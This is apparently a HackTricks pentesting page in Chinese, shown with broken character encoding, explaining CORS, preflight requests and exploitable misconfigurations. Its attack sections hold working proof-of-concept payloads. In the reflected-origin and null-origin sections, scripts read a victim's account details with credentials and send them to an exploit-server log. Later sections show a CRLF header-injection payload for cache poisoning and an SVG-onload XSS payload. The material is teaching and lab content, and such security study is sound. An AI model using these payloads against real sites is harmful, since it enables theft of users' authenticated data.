# CORS - é…ç½®é”™è¯¯å’Œç»•è¿‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä»€ä¹ˆæ˜¯CORSï¼Ÿ

CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰æ ‡å‡†æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºå®ƒ**å…è®¸æœåŠ¡å™¨æŒ‡å®šè°å¯ä»¥è®¿é—®å…¶èµ„æº**ä»¥åŠå…è®¸æ¥è‡ªå¤–éƒ¨èµ„æºçš„å“ªäº›**HTTPè¯·æ±‚æ–¹æ³•**ã€‚

**åŒæºç­–ç•¥**è¦æ±‚**è¯·æ±‚èµ„æºçš„æœåŠ¡å™¨**å’Œ**èµ„æºæ‰€åœ¨çš„æœåŠ¡å™¨**ä½¿ç”¨ç›¸åŒçš„åè®®ï¼ˆ[http://ï¼‰ï¼ŒåŸŸå](http://\ï¼‰ï¼ŒåŸŸåï¼‰å’Œç›¸åŒçš„**ç«¯å£**ï¼ˆ80ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœæœåŠ¡å™¨å¼ºåˆ¶æ‰§è¡ŒåŒæºç­–ç•¥ï¼Œåˆ™åªæœ‰æ¥è‡ªç›¸åŒåŸŸå’Œç«¯å£çš„ç½‘é¡µæ‰èƒ½è®¿é—®èµ„æºã€‚

ä¸‹è¡¨æ˜¾ç¤ºäº†åœ¨`http://normal-website.com/example/example.html`ä¸­å¦‚ä½•åº”ç”¨åŒæºç­–ç•¥ï¼š

| è®¿é—®çš„URL                                | å…è®¸è®¿é—®ï¼Ÿ                         |
| ---------------------------------------- | --------------------------------- |
| `http://normal-website.com/example/`      | æ˜¯ï¼šç›¸åŒçš„åè®®ã€åŸŸå’Œç«¯å£           |
| `http://normal-website.com/example2/`     | æ˜¯ï¼šç›¸åŒçš„åè®®ã€åŸŸå’Œç«¯å£           |
| `https://normal-website.com/example/`     | å¦ï¼šä¸åŒçš„åè®®å’Œç«¯å£               |
| `http://en.normal-website.com/example/`   | å¦ï¼šä¸åŒçš„åŸŸå                     |
| `http://www.normal-website.com/example/`  | å¦ï¼šä¸åŒçš„åŸŸå                     |
| `http://normal-website.com:8080/example/` | å¦ï¼šä¸åŒçš„ç«¯å£\*                   |

\*_Internet Explorerå°†å…è®¸æ­¤è®¿é—®ï¼Œå› ä¸ºIEåœ¨åº”ç”¨åŒæºç­–ç•¥æ—¶ä¸è€ƒè™‘ç«¯å£å·ã€‚_

### `Access-Control-Allow-Origin` å¤´éƒ¨

`Access-Control-Allow-Origin` çš„è§„èŒƒå…è®¸**å¤šä¸ªæ¥æº**ï¼Œæˆ–å€¼ä¸º**`null`**ï¼Œæˆ–é€šé…ç¬¦**`*`**ã€‚ç„¶è€Œï¼Œ**æ²¡æœ‰æµè§ˆå™¨æ”¯æŒå¤šä¸ªæ¥æº**ï¼Œå¹¶ä¸”å¯¹ä½¿ç”¨é€šé…ç¬¦**`*`**æœ‰**é™åˆ¶**ã€‚ï¼ˆ_é€šé…ç¬¦åªèƒ½å•ç‹¬ä½¿ç”¨ï¼Œè¿™å°†å¤±è´¥ `Access-Control-Allow-Origin: https://*.normal-website.com`ï¼Œå¹¶ä¸”ä¸èƒ½ä¸_ _Access-Control-Allow-Credentials: true_ _ä¸€èµ·ä½¿ç”¨_ï¼‰

å½“ç½‘ç«™è¯·æ±‚è·¨åŸŸèµ„æºæ—¶ï¼Œæµè§ˆå™¨ä¼šæ·»åŠ ä¸€ä¸ª`Origin`å¤´éƒ¨ï¼ŒæœåŠ¡å™¨åœ¨è¿”å›æ—¶ä¼šåŒ…å«è¿™ä¸ª`Access-Control-Allow-Origin`å¤´éƒ¨ã€‚

### `Access-Control-Allow-Credentials` å¤´éƒ¨

è·¨åŸŸèµ„æºè¯·æ±‚çš„**é»˜è®¤**è¡Œä¸ºæ˜¯**ä¸ä¼ é€’å‡­æ®**ï¼Œå¦‚cookieså’ŒAuthorizationå¤´éƒ¨ã€‚ç„¶è€Œï¼Œè·¨åŸŸæœåŠ¡å™¨å¯ä»¥é€šè¿‡å°†CORSçš„`Access-Control-Allow-Credentials`å¤´éƒ¨è®¾ç½®ä¸º**`true`**æ¥å…è®¸è¯»å–**å“åº”**æ—¶ä¼ é€’ç»™å®ƒçš„**å‡­æ®**ã€‚

å¦‚æœå€¼è®¾ç½®ä¸º`true`ï¼Œåˆ™æµè§ˆå™¨å°†å‘é€å‡­æ®ï¼ˆcookiesã€æˆæƒå¤´éƒ¨æˆ–TLSå®¢æˆ·ç«¯è¯ä¹¦ï¼‰ã€‚
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### é¢„æ£€è¯·æ±‚

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“è·¨åŸŸè¯·æ±‚ï¼š

- åŒ…å«**éæ ‡å‡†çš„HTTPæ–¹æ³•ï¼ˆHEADï¼ŒGETï¼ŒPOSTï¼‰**
- åŒ…å«æ–°çš„**å¤´éƒ¨**
- åŒ…å«ç‰¹æ®Šçš„**Content-Typeå¤´éƒ¨å€¼**

{% hint style="info" %}
**è¯·æŸ¥çœ‹**[**æ­¤é“¾æ¥**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)**ä¸­è¯·æ±‚çš„æ¡ä»¶ï¼Œä»¥é¿å…å‘é€é¢„æ£€è¯·æ±‚**
{% endhint %}

è·¨åŸŸè¯·æ±‚ä¼šåœ¨**`OPTIONS`æ–¹æ³•**çš„**è¯·æ±‚**ä¹‹å‰è¿›è¡Œï¼ŒCORSåè®®è¦æ±‚åœ¨å…è®¸è·¨åŸŸè¯·æ±‚ä¹‹å‰å¯¹**æ–¹æ³•å’Œå¤´éƒ¨è¿›è¡Œåˆå§‹æ£€æŸ¥**ã€‚è¿™è¢«ç§°ä¸º**é¢„æ£€æŸ¥**ã€‚æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªå…è®¸çš„æ–¹æ³•åˆ—è¡¨ï¼Œä»¥åŠå—ä¿¡ä»»çš„æ¥æºï¼Œæµè§ˆå™¨ä¼šæ£€æŸ¥è¯·æ±‚ç½‘ç«™çš„æ–¹æ³•æ˜¯å¦è¢«å…è®¸ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå³ä½¿ä¸å‘é€é¢„æ£€è¯·æ±‚ï¼Œå› ä¸º"å¸¸è§„è¯·æ±‚"çš„æ¡ä»¶å¾—åˆ°äº†éµå®ˆï¼Œ**å“åº”ä»ç„¶éœ€è¦å…·æœ‰æˆæƒå¤´éƒ¨**ï¼Œå¦åˆ™**æµè§ˆå™¨å°†æ— æ³•è¯»å–è¯·æ±‚çš„å“åº”**ã€‚
{% endhint %}

ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªé¢„æ£€è¯·æ±‚ï¼Œå®ƒè¯•å›¾ä¸ä¸€ä¸ªåä¸º`Special-Request-Header`çš„**è‡ªå®šä¹‰**è¯·æ±‚**å¤´éƒ¨**ä¸€èµ·ä½¿ç”¨**`PUT`æ–¹æ³•**ï¼š
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
æœåŠ¡å™¨å¯èƒ½è¿”å›ä»¥ä¸‹å“åº”ï¼š
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` å…è®¸çš„è¯·æ±‚å¤´
* `Access-Control-Expose-Headers` å…è®¸æš´éœ²çš„å“åº”å¤´
* `Access-Control-Max-Age` å®šä¹‰é¢„æ£€è¯·æ±‚çš„æœ€å¤§ç¼“å­˜æ—¶é—´
* `Access-Control-Request-Headers` è·¨åŸŸè¯·æ±‚æƒ³è¦å‘é€çš„è¯·æ±‚å¤´
* `Access-Control-Request-Method` è·¨åŸŸè¯·æ±‚æƒ³è¦ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•
* `Origin` è·¨åŸŸè¯·æ±‚çš„æ¥æºï¼ˆç”±æµè§ˆå™¨è‡ªåŠ¨è®¾ç½®ï¼‰

![](../.gitbook/assets/preflight.svg)

è¯·æ³¨æ„ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼ˆå–å†³äºå†…å®¹ç±»å‹å’Œè®¾ç½®çš„è¯·æ±‚å¤´ï¼‰ï¼Œåœ¨**GET/POSTè¯·æ±‚ä¸­ä¸ä¼šå‘é€é¢„æ£€è¯·æ±‚**ï¼ˆè¯·æ±‚ä¼š**ç›´æ¥å‘é€**ï¼‰ï¼Œä½†æ˜¯å¦‚æœæ‚¨æƒ³è¦è®¿é—®å“åº”çš„**è¯·æ±‚å¤´/ä¸»ä½“**ï¼Œå®ƒå¿…é¡»åŒ…å«ä¸€ä¸ªå…è®¸çš„_Access-Control-Allow-Origin_å¤´ã€‚\
**å› æ­¤ï¼ŒCORSä¸èƒ½é˜²æ­¢CSRFï¼ˆä½†å®ƒå¯èƒ½æœ‰æ‰€å¸®åŠ©ï¼‰ã€‚**

### **æœ¬åœ°ç½‘ç»œè¯·æ±‚çš„é¢„æ£€è¯·æ±‚**

å½“è¯·æ±‚å‘é€åˆ°æœ¬åœ°ç½‘ç»œIPåœ°å€æ—¶ï¼Œä¼šå‘é€2ä¸ªé¢å¤–çš„CORSå¤´ï¼š

* `Access-Control-Request-Local-Network` å®¢æˆ·ç«¯è¯·æ±‚å¤´æŒ‡ç¤ºè¯·æ±‚æ˜¯æœ¬åœ°ç½‘ç»œè¯·æ±‚
* `Access-Control-Allow-Local-Network` æœåŠ¡å™¨å“åº”å¤´æŒ‡ç¤ºèµ„æºå¯ä»¥å®‰å…¨åœ°ä¸å¤–éƒ¨ç½‘ç»œå…±äº«

**å…è®¸æœ¬åœ°ç½‘ç»œè¯·æ±‚çš„æœ‰æ•ˆå“åº”**è¿˜éœ€è¦åœ¨å“åº”ä¸­åŒ…å«å¤´`Access-Controls-Allow-Local_network: true`ï¼š
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼ŒLinuxä¸­çš„**0.0.0.0** IPåœ°å€å¯ç”¨äº**ç»•è¿‡**è®¿é—®æœ¬åœ°ä¸»æœºçš„è¦æ±‚ï¼Œå› ä¸ºè¯¥IPåœ°å€ä¸è¢«è§†ä¸ºâ€œæœ¬åœ°â€ã€‚

å¦‚æœæ‚¨ä½¿ç”¨æœ¬åœ°ç«¯ç‚¹çš„**å…¬å…±IPåœ°å€**ï¼ˆå¦‚è·¯ç”±å™¨çš„å…¬å…±IPåœ°å€ï¼‰ï¼Œè¿˜å¯ä»¥**ç»•è¿‡æœ¬åœ°ç½‘ç»œè¦æ±‚**ã€‚å› ä¸ºåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå³ä½¿è®¿é—®çš„æ˜¯**å…¬å…±IP**ï¼Œå¦‚æœæ˜¯**æ¥è‡ªæœ¬åœ°ç½‘ç»œ**ï¼Œä¹Ÿä¼šè¢«æˆäºˆè®¿é—®æƒé™ã€‚

{% endhint %}

## å¯åˆ©ç”¨çš„é…ç½®é”™è¯¯

è¯·æ³¨æ„ï¼Œå¤§å¤šæ•°**çœŸå®æ”»å‡»éœ€è¦å°†`Access-Control-Allow-Credentials`**è®¾ç½®ä¸º**`true`**ï¼Œå› ä¸ºè¿™å°†å…è®¸æµè§ˆå™¨å‘é€å‡­æ®å¹¶è¯»å–å“åº”ã€‚æ²¡æœ‰å‡­æ®ï¼Œè®¸å¤šæ”»å‡»å˜å¾—æ— å…³ç´§è¦ï¼›è¿™æ„å‘³ç€æ‚¨æ— æ³•åˆ©ç”¨ç”¨æˆ·çš„Cookieï¼Œå› æ­¤è®©ä»–ä»¬çš„æµè§ˆå™¨å‘å‡ºè¯·æ±‚è€Œä¸æ˜¯è‡ªå·±å‘å‡ºè¯·æ±‚æ˜¯æ²¡æœ‰ä»»ä½•æ”¶ç›Šçš„ã€‚

ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ä¾‹å¤–æ˜¯å½“**å—å®³è€…çš„ç½‘ç»œä½ç½®å……å½“ä¸€ç§èº«ä»½éªŒè¯æ–¹å¼**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºä»£ç†æ¥ç»•è¿‡åŸºäºIPçš„èº«ä»½éªŒè¯å¹¶è®¿é—®å†…éƒ¨ç½‘ç»œåº”ç”¨ç¨‹åºã€‚åœ¨å½±å“æ–¹é¢ï¼Œè¿™ä¸DNSé‡ç»‘å®šç±»ä¼¼ï¼Œä½†è¦åˆ©ç”¨èµ·æ¥è¦ç®€å•å¾—å¤šã€‚

### åœ¨`Access-Control-Allow-Origin`ä¸­åå°„`Origin`

åœ¨ç°å®ä¸–ç•Œä¸­ï¼Œ**è¿™ä¸¤ä¸ªæ ‡å¤´çš„å€¼ä¸å…è®¸åŒæ—¶å‡ºç°**ã€‚\
åŒæ ·ï¼Œè®¸å¤šå¼€å‘äººå‘˜å¸Œæœ›**åœ¨CORSä¸­å…è®¸å¤šä¸ªURL**ï¼Œä½†ä¸å…è®¸ä½¿ç”¨å­åŸŸé€šé…ç¬¦æˆ–URLåˆ—è¡¨ã€‚å› æ­¤ï¼Œä¸€äº›å¼€å‘äººå‘˜ä¼š**åŠ¨æ€ç”Ÿæˆ**\*\*`Access-Control-Allow-Origin`\*\*æ ‡å¤´ï¼Œå¹¶ä¸”åœ¨å¤šä¸ªæƒ…å†µä¸‹ï¼Œä»–ä»¬åªæ˜¯**å¤åˆ¶Originæ ‡å¤´çš„å€¼**ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**åŒæ ·çš„æ¼æ´å¯èƒ½ä¼šè¢«åˆ©ç”¨**ã€‚

åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜å¯ä»¥æ£€æŸ¥**åŸŸ**ï¼ˆ_victimdomain.com_ï¼‰**æ˜¯å¦å‡ºç°**åœ¨**Originæ ‡å¤´**ä¸­ï¼Œç„¶åï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨åä¸º**`attackervictimdomain.com`**çš„åŸŸæ¥çªƒå–æœºå¯†ä¿¡æ¯ã€‚
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` Origin

`null`æ˜¯**Origin**å¤´çš„ä¸€ä¸ªç‰¹æ®Šå€¼ã€‚è§„èŒƒä¸­æåˆ°å®ƒä¼šåœ¨é‡å®šå‘å’Œæœ¬åœ°HTMLæ–‡ä»¶ä¸­è§¦å‘ã€‚ä¸€äº›åº”ç”¨ç¨‹åºå¯èƒ½ä¼šå°†`null` originåˆ—å…¥ç™½åå•ï¼Œä»¥æ”¯æŒåº”ç”¨ç¨‹åºçš„æœ¬åœ°å¼€å‘ã€‚\
è¿™å¾ˆå¥½ï¼Œå› ä¸º**ä¸€äº›åº”ç”¨ç¨‹åºå…è®¸CORSä¸­çš„è¿™ä¸ªå€¼**ï¼Œå¹¶ä¸”**ä»»ä½•ç½‘ç«™éƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨æ²™ç›’iframeè½»æ¾è·å–null origin**ï¼š
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

å¦‚æœä½ å‘ç°åŸŸå _victim.com_ è¢«**ç™½åå•**äº†ï¼Œä½ åº”è¯¥æ£€æŸ¥ _victim.com.**attacker.com**_ æ˜¯å¦ä¹Ÿè¢«**ç™½åå•**ï¼Œæˆ–è€…ï¼Œå¦‚æœä½ å¯ä»¥**æ¥ç®¡æŸä¸ªå­åŸŸå**ï¼Œæ£€æŸ¥ _**somesubdomain**.victim.com_ æ˜¯å¦è¢«ç™½åå•ã€‚

### **é«˜çº§æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

å¤§å¤šæ•°ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­è¯†åˆ«åŸŸåçš„æ­£åˆ™è¡¨è¾¾å¼å°†å…³æ³¨å­—æ¯æ•°å­—ASCIIå­—ç¬¦å’Œ`.-`ã€‚å› æ­¤ï¼Œåƒ `victimdomain.com{.attacker.com` è¿™æ ·çš„å­—ç¬¦ä¸²åœ¨ Origin å¤´éƒ¨ä¸­å°†è¢«è§£é‡Šä¸ºåŸŸåæ˜¯ `victimdomain.com`ï¼Œä½†æµè§ˆå™¨ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ Safari æ”¯æŒè¯¥å­—ç¬¦ä½œä¸ºåŸŸåï¼‰å°†è®¿é—® `attacker.com` è¿™ä¸ªåŸŸåã€‚

ä¸‹åˆ’çº¿ `_` å­—ç¬¦ï¼ˆåœ¨å­åŸŸåä¸­ï¼‰ä¸ä»…åœ¨ Safari ä¸­æ”¯æŒï¼Œè€Œä¸”åœ¨ Chrome å’Œ Firefox ä¸­ä¹Ÿæ”¯æŒï¼

**å› æ­¤ï¼Œä½¿ç”¨å…¶ä¸­ä¸€ä¸ªå­åŸŸåï¼Œä½ å¯ä»¥ç»•è¿‡ä¸€äº›â€œå¸¸è§â€çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰¾åˆ° URL çš„ä¸»åŸŸåã€‚**

**æœ‰å…³æ­¤ç»•è¿‡çš„æ›´å¤šä¿¡æ¯å’Œè®¾ç½®ï¼Œè¯·æŸ¥çœ‹ï¼š**[**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **å’Œ**[**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### æ¥è‡ªå­åŸŸåå†…çš„ XSS æ”»å‡»

å¼€å‘äººå‘˜ç”¨äºé˜²å¾¡ CORS æ”»å‡»çš„ä¸€ç§æœºåˆ¶æ˜¯å°†ç»å¸¸è¯·æ±‚è®¿é—®ä¿¡æ¯çš„åŸŸååŠ å…¥ç™½åå•ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸å®Œå…¨å®‰å…¨ï¼Œå› ä¸ºå³ä½¿**ä¸€ä¸ª**è¢«**ç™½åå•**çš„åŸŸåçš„å­åŸŸåå®¹æ˜“å—åˆ°å…¶ä»–æ”»å‡»ï¼ˆå¦‚ XSSï¼‰çš„å½±å“ï¼Œå®ƒä¹Ÿå¯ä»¥å¯ç”¨ CORS æ”»å‡»ã€‚

è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œä¸‹é¢çš„ä»£ç æ˜¾ç¤ºäº†å…è®¸ _requester.com_ çš„å­åŸŸåè®¿é—® _provider.com_ èµ„æºçš„é…ç½®ã€‚
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
å‡è®¾ç”¨æˆ·å¯ä»¥è®¿é—®sub.requester.comä½†æ— æ³•è®¿é—®requester.comï¼Œå¹¶ä¸”å‡è®¾`sub.requester.com`æ˜“å—XSSæ”»å‡»ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ä½¿ç”¨è·¨ç«™è„šæœ¬æ”»å‡»æ–¹æ³•æ¥åˆ©ç”¨`provider.com`ã€‚

### **æœåŠ¡å™¨ç«¯ç¼“å­˜æ±¡æŸ“**

å¦‚æœæ¡ä»¶æˆç†Ÿï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€šè¿‡HTTPå¤´æ³¨å…¥è¿›è¡ŒæœåŠ¡å™¨ç«¯ç¼“å­˜æ±¡æŸ“ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ª[å­˜å‚¨å‹XSS](https://portswigger.net/web-security/cross-site-scripting/stored)æ¼æ´ã€‚

å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åº**åå°„**äº†**Originå¤´**è€Œæ²¡æœ‰å¯¹å…¶è¿›è¡Œéæ³•å­—ç¬¦æ£€æŸ¥ï¼Œä¾‹å¦‚é€—å·ï¼Œæˆ‘ä»¬å®é™…ä¸Šå°±æœ‰äº†ä¸€ä¸ª**é’ˆå¯¹IE/Edgeç”¨æˆ·çš„HTTPå¤´æ³¨å…¥æ¼æ´ï¼Œå› ä¸ºInternet Explorerå’ŒEdgeå°†\rï¼ˆ0x0dï¼‰è§†ä¸ºæœ‰æ•ˆçš„HTTPå¤´ç»ˆæ­¢ç¬¦**ï¼š`GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorerå°†å“åº”è§†ä¸ºï¼š

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

è¿™å¹¶ä¸æ˜¯ç›´æ¥å¯åˆ©ç”¨çš„ï¼Œå› ä¸ºæ”»å‡»è€…æ— æ³•è®©æŸäººçš„Webæµè§ˆå™¨å‘é€è¿™æ ·çš„æ ¼å¼é”™è¯¯çš„å¤´éƒ¨ï¼Œä½†æ˜¯æˆ‘å¯ä»¥**åœ¨Burp Suiteä¸­æ‰‹åŠ¨æ„é€ æ­¤è¯·æ±‚ï¼Œå¹¶ä¸”æœåŠ¡å™¨ç«¯ç¼“å­˜å¯èƒ½ä¼šä¿å­˜å“åº”å¹¶å°†å…¶æä¾›ç»™å…¶ä»–äºº**ã€‚æˆ‘ä½¿ç”¨çš„æœ‰æ•ˆè½½è·å°†æ›´æ”¹é¡µé¢çš„å­—ç¬¦é›†ä¸º**UTF-7**ï¼Œè¿™åœ¨åˆ›å»ºXSSæ¼æ´æ–¹é¢éå¸¸æœ‰ç”¨ã€‚

### **å®¢æˆ·ç«¯ç¼“å­˜æ±¡æŸ“**

æ‚¨å¯èƒ½å¶å°”ä¼šé‡åˆ°ä¸€ä¸ªé¡µé¢ï¼Œå…¶ä¸­è‡ªå®šä¹‰HTTPå¤´ä¸­å­˜åœ¨[åå°„å‹XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)ã€‚å‡è®¾ä¸€ä¸ªç½‘é¡µåå°„äº†ä¸€ä¸ªè‡ªå®šä¹‰å¤´çš„å†…å®¹è€Œæ²¡æœ‰è¿›è¡Œç¼–ç ï¼š
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
ä½¿ç”¨CORSï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Headerä¸­å‘é€ä»»ä½•å€¼ã€‚å•ç‹¬æ¥è¯´ï¼Œ**è¿™æ˜¯æ— ç”¨çš„**ï¼Œå› ä¸ºåŒ…å«æˆ‘ä»¬**æ³¨å…¥çš„JavaScriptçš„å“åº”ä¸ä¼šè¢«æ¸²æŸ“**ã€‚ç„¶è€Œï¼Œ**å¦‚æœæ²¡æœ‰æŒ‡å®šVary: Origin**ï¼Œå“åº”**å¯èƒ½ä¼šè¢«å­˜å‚¨åœ¨æµè§ˆå™¨çš„ç¼“å­˜ä¸­ï¼Œå¹¶åœ¨æµè§ˆå™¨å¯¼èˆªåˆ°ç›¸å…³URLæ—¶ç›´æ¥æ˜¾ç¤º**ã€‚æˆ‘å·²ç»åˆ›å»ºäº†ä¸€ä¸ªfiddleæ¥[å°è¯•åœ¨æ‚¨é€‰æ‹©çš„URLä¸Šè¿›è¡Œæ­¤æ”»å‡»](https://jsfiddle.net/3gk8u8wu/3/)ã€‚ç”±äºæ­¤æ”»å‡»ä½¿ç”¨å®¢æˆ·ç«¯ç¼“å­˜ï¼Œå®ƒå®é™…ä¸Šéå¸¸å¯é ã€‚
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## ç»•è¿‡

### XSSIï¼ˆè·¨ç«™è„šæœ¬åŒ…å«ï¼‰/ JSONP

XSSIæŒ‡çš„æ˜¯ä¸€ç§åˆ©ç”¨`script`æ ‡ç­¾åŒ…å«èµ„æºæ—¶ï¼Œç”±äºè„šæœ¬éœ€è¦èƒ½å¤Ÿè·¨åŸŸåŒ…å«ï¼Œå› æ­¤SOPä¸é€‚ç”¨çš„æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä½¿ç”¨`script`æ ‡ç­¾æ¥è¯»å–æ‰€æœ‰è¢«åŒ…å«çš„å†…å®¹ã€‚

å½“æ¶‰åŠåˆ°åŠ¨æ€JavaScriptæˆ–JSONPæ—¶ï¼Œè¿™ä¸€ç‚¹å°¤å…¶æœ‰è¶£ï¼Œå› ä¸ºè¿™äº›æƒ…å†µä¸‹ä½¿ç”¨äº†æ‰€è°“çš„ç¯å¢ƒæˆæƒä¿¡æ¯ï¼Œæ¯”å¦‚cookiesç”¨äºèº«ä»½éªŒè¯ã€‚å½“ä»ä¸åŒçš„ä¸»æœºè¯·æ±‚èµ„æºæ—¶ï¼Œè¿™äº›cookiesä¼šè¢«åŒ…å«è¿›æ¥ã€‚BurpSuiteæ’ä»¶ï¼š[https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

